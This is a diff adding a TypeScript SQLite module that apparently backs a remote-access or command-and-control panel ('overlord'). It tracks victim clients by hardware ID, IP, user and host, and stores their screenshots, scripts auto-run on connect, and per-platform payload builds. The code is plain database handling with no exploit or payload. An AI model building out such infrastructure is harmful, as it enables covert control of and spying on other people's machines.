@@ -1,0 +1,526 @@
+import Database from "bun:sqlite";
+import { ClientInfo, ListFilters, ListResult, ClientRole } from "./types";
+import { getThumbnail } from "./thumbnails";
+import { resolve } from "path";
+import { ensureDataDir } from "./paths";
+
+const dataDir = ensureDataDir();
+const dbPath = resolve(dataDir, "overlord.db");
+const db = new Database(dbPath);
+console.log(`[db] Using database at: ${dbPath}`);
+
+db.run(`
+  CREATE TABLE IF NOT EXISTS clients (
+    id TEXT PRIMARY KEY,
+    hwid TEXT,
+    role TEXT,
+    ip TEXT,
+    host TEXT,
+    os TEXT,
+    arch TEXT,
+    version TEXT,
+    user TEXT,
+    monitors INTEGER,
+    country TEXT,
+    last_seen INTEGER,
+    online INTEGER,
+    ping_ms INTEGER
+  );
+`);
+try {
+  db.run(`ALTER TABLE clients ADD COLUMN role TEXT`);
+} catch {}
+try {
+  db.run(`ALTER TABLE clients ADD COLUMN hwid TEXT`);
+} catch {}
+try {
+  db.run(`ALTER TABLE clients ADD COLUMN ip TEXT`);
+} catch {}
+
+db.run(`
+  CREATE TABLE IF NOT EXISTS banned_ips (
+    ip TEXT PRIMARY KEY,
+    reason TEXT,
+    created_at INTEGER NOT NULL
+  );
+`);
+db.run(
+  `CREATE INDEX IF NOT EXISTS idx_banned_ips_created_at ON banned_ips(created_at DESC);`,
+);
+
+db.run(`
+  CREATE TABLE IF NOT EXISTS builds (
+    id TEXT PRIMARY KEY,
+    status TEXT NOT NULL,
+    start_time INTEGER NOT NULL,
+    expires_at INTEGER NOT NULL,
+    files TEXT NOT NULL
+  );
+`);
+
+db.run(`
+  CREATE TABLE IF NOT EXISTS notification_screenshots (
+    id TEXT PRIMARY KEY,
+    notification_id TEXT NOT NULL,
+    client_id TEXT NOT NULL,
+    ts INTEGER NOT NULL,
+    format TEXT NOT NULL,
+    width INTEGER,
+    height INTEGER,
+    bytes BLOB NOT NULL
+  );
+`);
+db.run(
+  `CREATE INDEX IF NOT EXISTS idx_notification_screenshots_notification_id ON notification_screenshots(notification_id);`,
+);
+db.run(
+  `CREATE INDEX IF NOT EXISTS idx_notification_screenshots_ts ON notification_screenshots(ts DESC);`,
+);
+
+db.run(`
+  CREATE TABLE IF NOT EXISTS auto_scripts (
+    id TEXT PRIMARY KEY,
+    name TEXT NOT NULL,
+    trigger TEXT NOT NULL,
+    script TEXT NOT NULL,
+    script_type TEXT NOT NULL,
+    enabled INTEGER NOT NULL,
+    created_at INTEGER NOT NULL,
+    updated_at INTEGER NOT NULL
+  );
+`);
+db.run(
+  `CREATE INDEX IF NOT EXISTS idx_auto_scripts_trigger ON auto_scripts(trigger, enabled);`,
+);
+
+db.run(`
+  CREATE TABLE IF NOT EXISTS auto_script_runs (
+    script_id TEXT NOT NULL,
+    client_id TEXT NOT NULL,
+    ts INTEGER NOT NULL,
+    PRIMARY KEY (script_id, client_id)
+  );
+`);
+db.run(
+  `CREATE INDEX IF NOT EXISTS idx_auto_script_runs_ts ON auto_script_runs(ts DESC);`,
+);
+
+export function upsertClientRow(
+  partial: Partial<ClientInfo> & {
+    id: string;
+    lastSeen?: number;
+    online?: number;
+  },
+) {
+  const now = partial.lastSeen ?? Date.now();
+  db.run(
+    `INSERT INTO clients (id, hwid, role, ip, host, os, arch, version, user, monitors, country, last_seen, online, ping_ms)
+     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+     ON CONFLICT(id) DO UPDATE SET
+       hwid=COALESCE(excluded.hwid, clients.hwid),
+       role=COALESCE(excluded.role, clients.role),
+       ip=COALESCE(excluded.ip, clients.ip),
+       host=COALESCE(excluded.host, clients.host),
+       os=COALESCE(excluded.os, clients.os),
+       arch=COALESCE(excluded.arch, clients.arch),
+       version=COALESCE(excluded.version, clients.version),
+       user=COALESCE(excluded.user, clients.user),
+       monitors=COALESCE(excluded.monitors, clients.monitors),
+       country=COALESCE(excluded.country, clients.country),
+       last_seen=excluded.last_seen,
+       online=COALESCE(excluded.online, clients.online),
+       ping_ms=COALESCE(excluded.ping_ms, clients.ping_ms)
+    `,
+    partial.id,
+    partial.hwid ?? partial.id,
+    partial.role ?? null,
+    partial.ip ?? null,
+    partial.host ?? null,
+    partial.os ?? null,
+    partial.arch ?? null,
+    partial.version ?? null,
+    partial.user ?? null,
+    partial.monitors ?? null,
+    partial.country ?? null,
+    now,
+    partial.online ?? 0,
+    partial.pingMs ?? null,
+  );
+
+  if (partial.hwid) {
+    db.run(
+      `DELETE FROM clients WHERE hwid=? AND id<>?`,
+      partial.hwid,
+      partial.id,
+    );
+  }
+}
+
+export function setOnlineState(id: string, online: boolean) {
+  db.run(
+    `UPDATE clients SET online=?, last_seen=? WHERE id=?`,
+    online ? 1 : 0,
+    Date.now(),
+    id,
+  );
+}
+
+export function deleteClientRow(id: string) {
+  db.run(`DELETE FROM clients WHERE id=?`, id);
+}
+
+export function getClientIp(id: string): string | null {
+  const row = db.query<{ ip: string }>(`SELECT ip FROM clients WHERE id=?`).get(id);
+  return row?.ip || null;
+}
+
+export function banIp(ip: string, reason?: string) {
+  db.run(
+    `INSERT OR REPLACE INTO banned_ips (ip, reason, created_at) VALUES (?, ?, ?)`
+    , ip,
+    reason || null,
+    Date.now(),
+  );
+}
+
+export function unbanIp(ip: string) {
+  db.run(`DELETE FROM banned_ips WHERE ip=?`, ip);
+}
+
+export function isIpBanned(ip: string): boolean {
+  const row = db.query<{ ip: string }>(`SELECT ip FROM banned_ips WHERE ip=?`).get(ip);
+  return !!row?.ip;
+}
+
+export function markAllClientsOffline() {
+  db.run(`UPDATE clients SET online=0`);
+  console.log("[db] marked all clients as offline");
+}
+
+export function listClients(filters: ListFilters): ListResult {
+  const { page, pageSize, search, sort, statusFilter, osFilter } = filters;
+  const where: string[] = [];
+  const params: any[] = [];
+
+  if (search) {
+    where.push(
+      "(LOWER(COALESCE(host,'')) LIKE ? OR LOWER(COALESCE(user,'')) LIKE ? OR LOWER(id) LIKE ?)",
+    );
+    const needle = `%${search}%`;
+    params.push(needle, needle, needle);
+  }
+
+  if (statusFilter === "online") {
+    where.push("online=1");
+  } else if (statusFilter === "offline") {
+    where.push("online=0");
+  }
+
+  if (osFilter && osFilter !== "all") {
+    where.push("os=?");
+    params.push(osFilter);
+  }
+
+  const whereSql = where.length ? `WHERE ${where.join(" AND ")}` : "";
+
+  const orderBy = (() => {
+    switch (sort) {
+      case "ping_asc":
+        return "ORDER BY ping_ms IS NULL, ping_ms ASC";
+      case "ping_desc":
+        return "ORDER BY ping_ms IS NULL, ping_ms DESC";
+      case "host_asc":
+        return "ORDER BY LOWER(host) ASC";
+      case "host_desc":
+        return "ORDER BY LOWER(host) DESC";
+      default:
+        return "ORDER BY last_seen DESC";
+    }
+  })();
+
+  const totalRow = db
+    .query<{ c: number }>(`SELECT COUNT(*) as c FROM clients ${whereSql}`)
+    .get(...params) ?? { c: 0 };
+  const onlineRow = db
+    .query<{ c: number }>(`SELECT COUNT(*) as c FROM clients WHERE online=1`)
+    .get() ?? { c: 0 };
+  const offset = (page - 1) * pageSize;
+
+  const rows = db
+    .query<any>(
+      `SELECT id, hwid, role, host, os, arch, version, user, monitors, country, last_seen as lastSeen, online, ping_ms as pingMs
+       FROM clients
+       ${whereSql}
+       ${orderBy}
+       LIMIT ? OFFSET ?`,
+    )
+    .all(...params, pageSize, offset);
+
+  const items = rows.map((c: any) => ({
+    id: c.id,
+    hwid: c.hwid,
+    role: (c.role as ClientRole) || "client",
+    lastSeen: Number(c.lastSeen) || 0,
+    host: c.host,
+    os: c.os || "unknown",
+    arch: c.arch || "arch?",
+    version: c.version || "0",
+    user: c.user,
+    monitors: c.monitors,
+    country: c.country || "ZZ",
+    pingMs: c.pingMs ?? null,
+    online: c.online === 1,
+    thumbnail: getThumbnail(c.id),
+  }));
+
+  return { page, pageSize, total: totalRow.c, online: onlineRow.c, items };
+}
+
+export type AutoScriptTrigger = "on_connect" | "on_first_connect" | "on_connect_once";
+
+export type AutoScript = {
+  id: string;
+  name: string;
+  trigger: AutoScriptTrigger;
+  script: string;
+  scriptType: string;
+  enabled: boolean;
+  createdAt: number;
+  updatedAt: number;
+};
+
+function mapAutoScriptRow(row: any): AutoScript {
+  return {
+    id: row.id,
+    name: row.name,
+    trigger: row.trigger as AutoScriptTrigger,
+    script: row.script,
+    scriptType: row.script_type,
+    enabled: row.enabled === 1,
+    createdAt: Number(row.created_at) || 0,
+    updatedAt: Number(row.updated_at) || 0,
+  };
+}
+
+export function listAutoScripts(): AutoScript[] {
+  const rows = db.query<any>(`SELECT * FROM auto_scripts ORDER BY created_at DESC`).all();
+  return rows.map(mapAutoScriptRow);
+}
+
+export function getAutoScriptsByTrigger(trigger: AutoScriptTrigger): AutoScript[] {
+  const rows = db
+    .query<any>(
+      `SELECT * FROM auto_scripts WHERE trigger=? AND enabled=1 ORDER BY created_at ASC`,
+    )
+    .all(trigger);
+  return rows.map(mapAutoScriptRow);
+}
+
+export function getAutoScript(id: string): AutoScript | null {
+  const row = db.query<any>(`SELECT * FROM auto_scripts WHERE id=?`).get(id);
+  return row ? mapAutoScriptRow(row) : null;
+}
+
+export function createAutoScript(input: {
+  id: string;
+  name: string;
+  trigger: AutoScriptTrigger;
+  script: string;
+  scriptType: string;
+  enabled: boolean;
+}): AutoScript {
+  const now = Date.now();
+  db.run(
+    `INSERT INTO auto_scripts (id, name, trigger, script, script_type, enabled, created_at, updated_at)
+     VALUES (?, ?, ?, ?, ?, ?, ?, ?)`
+    ,
+    input.id,
+    input.name,
+    input.trigger,
+    input.script,
+    input.scriptType,
+    input.enabled ? 1 : 0,
+    now,
+    now,
+  );
+  return getAutoScript(input.id)!;
+}
+
+export function updateAutoScript(
+  id: string,
+  input: Partial<{
+    name: string;
+    trigger: AutoScriptTrigger;
+    script: string;
+    scriptType: string;
+    enabled: boolean;
+  }>,
+): AutoScript | null {
+  const current = getAutoScript(id);
+  if (!current) return null;
+
+  const next = {
+    name: input.name ?? current.name,
+    trigger: (input.trigger ?? current.trigger) as AutoScriptTrigger,
+    script: input.script ?? current.script,
+    scriptType: input.scriptType ?? current.scriptType,
+    enabled: typeof input.enabled === "boolean" ? input.enabled : current.enabled,
+  };
+
+  db.run(
+    `UPDATE auto_scripts SET name=?, trigger=?, script=?, script_type=?, enabled=?, updated_at=? WHERE id=?`
+    ,
+    next.name,
+    next.trigger,
+    next.script,
+    next.scriptType,
+    next.enabled ? 1 : 0,
+    Date.now(),
+    id,
+  );
+
+  return getAutoScript(id);
+}
+
+export function deleteAutoScript(id: string): boolean {
+  const result = db.run(`DELETE FROM auto_scripts WHERE id=?`, id);
+  db.run(`DELETE FROM auto_script_runs WHERE script_id=?`, id);
+  return (result as any)?.changes ? (result as any).changes > 0 : true;
+}
+
+export function hasAutoScriptRun(scriptId: string, clientId: string): boolean {
+  const row = db
+    .query<any>(
+      `SELECT script_id FROM auto_script_runs WHERE script_id=? AND client_id=?`,
+    )
+    .get(scriptId, clientId);
+  return !!row?.script_id;
+}
+
+export function recordAutoScriptRun(scriptId: string, clientId: string) {
+  db.run(
+    `INSERT OR REPLACE INTO auto_script_runs (script_id, client_id, ts) VALUES (?, ?, ?)`
+    ,
+    scriptId,
+    clientId,
+    Date.now(),
+  );
+}
+
+export function clientExists(id: string): boolean {
+  const row = db.query<any>(`SELECT id FROM clients WHERE id=?`).get(id);
+  return !!row?.id;
+}
+
+export interface BuildRecord {
+  id: string;
+  status: string;
+  startTime: number;
+  expiresAt: number;
+  files: Array<{
+    name: string;
+    filename: string;
+    platform: string;
+    size: number;
+  }>;
+}
+
+export function saveBuild(build: BuildRecord) {
+  db.run(
+    `INSERT OR REPLACE INTO builds (id, status, start_time, expires_at, files)
+     VALUES (?, ?, ?, ?, ?)`,
+    build.id,
+    build.status,
+    build.startTime,
+    build.expiresAt,
+    JSON.stringify(build.files),
+  );
+}
+
+export function getBuild(id: string): BuildRecord | null {
+  const row = db.query<any>(`SELECT * FROM builds WHERE id = ?`).get(id);
+  if (!row) return null;
+
+  return {
+    id: row.id,
+    status: row.status,
+    startTime: row.start_time,
+    expiresAt: row.expires_at,
+    files: JSON.parse(row.files),
+  };
+}
+
+export function getAllBuilds(): BuildRecord[] {
+  const rows = db
+    .query<any>(`SELECT * FROM builds ORDER BY start_time DESC`)
+    .all();
+  return rows.map((row) => ({
+    id: row.id,
+    status: row.status,
+    startTime: row.start_time,
+    expiresAt: row.expires_at,
+    files: JSON.parse(row.files),
+  }));
+}
+
+export function deleteExpiredBuilds() {
+  const now = Date.now();
+  db.run(`DELETE FROM builds WHERE expires_at <= ?`, now);
+}
+
+export function deleteBuild(id: string) {
+  db.run(`DELETE FROM builds WHERE id = ?`, id);
+}
+
+export interface NotificationScreenshotRecord {
+  id: string;
+  notificationId: string;
+  clientId: string;
+  ts: number;
+  format: string;
+  width?: number;
+  height?: number;
+  bytes: Uint8Array;
+}
+
+export function saveNotificationScreenshot(record: NotificationScreenshotRecord) {
+  db.run(
+    `INSERT OR REPLACE INTO notification_screenshots
+      (id, notification_id, client_id, ts, format, width, height, bytes)
+     VALUES (?, ?, ?, ?, ?, ?, ?, ?)`
+    ,
+    record.id,
+    record.notificationId,
+    record.clientId,
+    record.ts,
+    record.format,
+    record.width ?? null,
+    record.height ?? null,
+    record.bytes,
+  );
+}
+
+export function getNotificationScreenshot(notificationId: string): NotificationScreenshotRecord | null {
+  const row = db
+    .query<any>(
+      `SELECT * FROM notification_screenshots WHERE notification_id = ? ORDER BY ts DESC LIMIT 1`,
+    )
+    .get(notificationId);
+  if (!row) return null;
+
+  return {
+    id: row.id,
+    notificationId: row.notification_id,
+    clientId: row.client_id,
+    ts: row.ts,
+    format: row.format,
+    width: row.width ?? undefined,
+    height: row.height ?? undefined,
+    bytes: row.bytes,
+  };
+}
+
+export function clearNotificationScreenshots() {
+  db.run(`DELETE FROM notification_screenshots`);
+  console.log("[db] cleared notification screenshots");
+}
